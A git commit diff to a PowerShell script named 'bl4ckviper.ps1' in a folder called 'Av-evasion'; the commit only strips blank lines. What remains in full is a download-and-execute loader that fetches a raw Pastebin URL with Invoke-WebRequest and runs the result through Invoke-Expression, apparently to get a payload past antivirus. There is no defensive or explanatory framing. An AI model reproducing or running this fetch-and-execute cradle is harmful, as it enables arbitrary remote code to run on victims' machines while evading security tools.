bf8b2260ed0942ee1d9d6b82b16ec7dc2ea6be29
salahgeek <salahgeek07@gmail.com>
2024-05-09 22:42:50 +0100

    Update bl4ckviper.ps1

--- LAS/Av-evasion/bl4ckviper.ps1
+++ LAS/Av-evasion/bl4ckviper.ps1
@@ -1,8 +1,4 @@
-
-
 $scriptUrl = "https://pastebin.com/raw/34Dv0gCV"
-
 $scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
 $scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
-
 Invoke-Expression -Command $scriptContent
